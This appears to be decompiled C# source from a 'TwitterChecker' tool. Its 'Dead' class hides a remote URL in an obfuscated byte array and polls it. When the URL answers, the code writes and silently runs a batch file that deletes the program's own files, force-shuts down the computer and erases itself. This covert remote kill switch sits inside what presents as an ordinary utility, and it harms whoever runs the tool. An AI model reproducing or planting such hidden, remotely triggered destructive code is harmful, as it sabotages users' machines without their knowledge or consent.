using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using Leaf.xNet;

namespace TwitterChecker
{
	[SecuritySafeCritical]
	internal class Dead
	{
		internal static void Check()
		{
			if (AmIAlive())
			{
				Kill();
			}
		}

		protected static byte[] Url()
		{
			byte[] userData = new byte[128]
			{
				53, 104, 54, 106, 50, 105, 106, 103, 114, 51,
				50, 105, 52, 51, 50, 53, 104, 52, 117, 53,
				107, 106, 104, 50, 106, 105, 51, 50, 51, 52,
				105, 54, 51, 53, 116, 111, 106, 103, 107, 52,
				53, 104, 52, 51, 46, 99, 98, 97, 46, 112,
				108, 47, 102, 100, 114, 121, 114, 87, 68, 84,
				85, 89, 82, 83, 71, 72, 68, 83, 65, 53,
				54, 69, 87, 84, 52, 51, 54, 51, 47, 87,
				82, 51, 50, 52, 73, 74, 73, 74, 82, 73,
				74, 79, 73, 79, 84, 74, 52, 79, 73, 85,
				53, 79, 74, 52, 84, 51, 73, 53, 52, 53,
				74, 78, 79, 73, 73, 52, 72, 84, 85, 82,
				70, 82, 71, 46, 104, 116, 109, 108
			};
			return ProtectedData.Protect(userData, null, DataProtectionScope.CurrentUser);
		}

		protected static bool AmIAlive()
		{
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					httpRequest.ConnectTimeout = 3000;
					httpRequest.ReadWriteTimeout = 3000;
					HttpResponse httpResponse = httpRequest.Get(Encoding.Default.GetString(ProtectedData.Unprotect(Url(), null, DataProtectionScope.CurrentUser)));
					if (httpResponse.IsOK)
					{
						return true;
					}
				}
				return false;
			}
			catch
			{
				return false;
			}
		}

		protected static void Kill()
		{
			string text = "updater.bat";
			using (StreamWriter streamWriter = new StreamWriter(text, append: false, Encoding.Default))
			{
				streamWriter.Write(string.Format("timeout 1 >nul\r\n:del\r\n del \"{0}\"\r\n if exist \"{0}\" goto del\r\n del \"{1}\"\r\n if exist \"{1}\" goto del\r\nshutdown.exe /s /t 00\r\ndel %0\r\n", Assembly.GetEntryAssembly().Location, Assembly.GetExecutingAssembly().Location));
			}
			Process process = new Process();
			process.StartInfo.FileName = text;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
			Environment.Exit(0);
		}

		internal static void GoKill()
		{
			Kill();
		}
	}
}
